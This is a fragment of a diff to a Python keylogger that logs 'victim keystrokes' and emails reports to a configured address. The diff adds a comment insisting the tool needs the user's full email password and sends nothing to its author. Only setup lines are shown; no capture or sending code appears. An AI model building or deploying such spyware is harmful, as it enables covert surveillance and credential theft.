@@ -19,7 +19,7 @@ print("\nWill log victim keystrokes, and report back to\033[1;33;40m " + args.em
 send_report_every = args.length
 email_address = args.email
 email_password = args.password
-
+# yes it needs full email and passwords. no it will not send anything to me. read the code
 #keylogger functions
 class Keylogger:
 	def __init__(self, interval):
@@ -114,3 +114,4 @@ class Keylogger:
 if __name__ == "__main__":
     keylogger = Keylogger(interval=send_report_every)
     keylogger.start()
+	
